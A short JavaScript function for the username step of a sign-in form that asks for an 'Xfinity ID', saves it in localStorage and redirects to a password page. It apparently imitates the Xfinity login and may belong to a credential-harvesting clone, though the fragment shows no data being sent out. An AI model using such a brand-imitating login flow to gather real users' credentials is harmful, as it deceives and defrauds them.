function goNext() {
  const username = document.getElementById("username").value.trim();

  if (!username) {
    alert("Please enter your Xfinity ID.");
    return;
  }

  // Save username for password page
  localStorage.setItem("XfinityUser", username);

  // Move to password page
  window.location.href = "password.html";
}